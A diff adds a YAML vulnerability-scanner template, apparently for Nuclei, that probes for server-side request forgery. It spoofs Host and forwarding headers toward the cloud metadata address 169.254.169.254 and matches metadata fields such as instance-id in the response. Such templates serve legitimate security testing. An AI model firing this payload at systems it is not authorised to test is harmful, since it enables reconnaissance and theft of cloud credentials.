@@ -1,0 +1,28 @@
+id: fuzz-ssrf-header-injection
+
+info:
+  name: SSRF via Host Headers
+  author: openai
+  severity: high
+  tags: ssrf,host-header
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Host: "169.254.169.254"
+      X-Forwarded-Host: "169.254.169.254"
+      X-Forwarded-For: "127.0.0.1"
+      X-Original-URL: "/latest/meta-data/"
+      X-Forwarded-Scheme: "http"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "instance-id"
+          - "ami-id"
+          - "hostname"
+          - "ec2"
